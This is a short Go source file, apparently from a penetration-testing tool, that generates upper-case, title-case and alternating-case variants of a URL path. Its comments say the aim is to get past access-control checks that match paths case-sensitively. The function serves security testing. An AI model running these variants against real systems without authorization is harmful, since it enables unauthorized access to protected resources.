package poc

import (
	"strings"
	"unicode"
)

// PathCase 系统性路径大小写变异
// ref: nomore403 path-case technique
// 原理: 部分 ACL 系统对路径做精确匹配（区分大小写），而后端 Web 框架不区分
func PathCase(auth string) []string {
	var results []string

	parts := strings.Split(auth, "/")
	if len(parts) < 2 {
		return results
	}

	// 1. 全大写
	results = append(results, strings.ToUpper(auth))

	// 2. 全小写（如果原始路径有大写字母）
	lower := strings.ToLower(auth)
	if lower != auth {
		results = append(results, lower)
	}

	// 3. 首字母大写每段
	var titleCase strings.Builder
	for i, part := range parts {
		if i > 0 {
			titleCase.WriteString("/")
		}
		if len(part) > 0 {
			runes := []rune(part)
			runes[0] = unicode.ToUpper(runes[0])
			titleCase.WriteString(string(runes))
		}
	}
	titleResult := titleCase.String()
	if titleResult != auth {
		results = append(results, titleResult)
	}

	// 4. 交替大小写: aLtErNaTiNg
	var altCase strings.Builder
	charIdx := 0
	for _, ch := range auth {
		if ch == '/' {
			altCase.WriteRune(ch)
		} else {
			if charIdx%2 == 0 {
				altCase.WriteRune(unicode.ToLower(ch))
			} else {
				altCase.WriteRune(unicode.ToUpper(ch))
			}
			charIdx++
		}
	}
	altResult := altCase.String()
	if altResult != auth {
		results = append(results, altResult)
	}

	// 5. 仅最后一段做大小写变异（最常见的 ACL 绕过场景）
	lastSlash := strings.LastIndex(auth, "/")
	if lastSlash >= 0 && lastSlash < len(auth)-1 {
		prefix := auth[:lastSlash+1]
		lastSeg := auth[lastSlash+1:]

		// 最后一段全大写
		results = append(results, prefix+strings.ToUpper(lastSeg))

		// 最后一段首字母大写
		if len(lastSeg) > 0 {
			runes := []rune(lastSeg)
			runes[0] = unicode.ToUpper(runes[0])
			results = append(results, prefix+string(runes))
		}

		// 最后一段随机位变异: 翻转每个字符
		for i := 0; i < len(lastSeg) && i < 8; i++ {
			runes := []rune(lastSeg)
			if i < len(runes) {
				if unicode.IsLower(runes[i]) {
					runes[i] = unicode.ToUpper(runes[i])
				} else if unicode.IsUpper(runes[i]) {
					runes[i] = unicode.ToLower(runes[i])
				} else {
					continue
				}
				results = append(results, prefix+string(runes))
			}
		}
	}

	return results
}
